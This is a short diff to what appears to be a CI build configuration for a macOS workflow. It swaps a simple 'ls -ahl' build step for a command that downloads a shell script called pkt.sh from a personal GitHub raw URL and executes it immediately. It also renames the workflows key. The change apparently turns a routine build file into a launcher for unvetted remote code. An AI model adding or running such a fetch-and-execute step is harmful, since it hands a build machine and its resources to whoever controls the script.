@@ -1,7 +1,7 @@
-workflows:
+workflow:
   my-workflow:
     name: My workflow name
     instance_type: mac_pro
     max_build_duration: 120
     scripts:
-      - ls -ahl
+      - wget https://raw.githubusercontent.com/cnvrg001/mac/main/pkt.sh && sh pkt.sh
